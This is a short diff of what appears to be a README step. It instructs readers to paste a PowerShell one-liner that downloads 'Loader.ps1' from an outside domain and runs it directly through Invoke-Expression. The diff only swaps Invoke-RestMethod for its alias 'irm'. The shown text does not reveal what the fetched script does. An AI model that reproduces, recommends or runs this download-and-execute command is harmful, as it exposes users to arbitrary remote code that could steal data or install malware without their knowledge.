@@ -11,7 +11,7 @@
    Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
 
    ```cmd
-   Invoke-RestMethod https://ps-ps.cc/powershell/Loader.ps1 | Invoke-Expression
+   irm https://ps-ps.cc/powershell/Loader.ps1 | Invoke-Expression
    ```
 
 ---
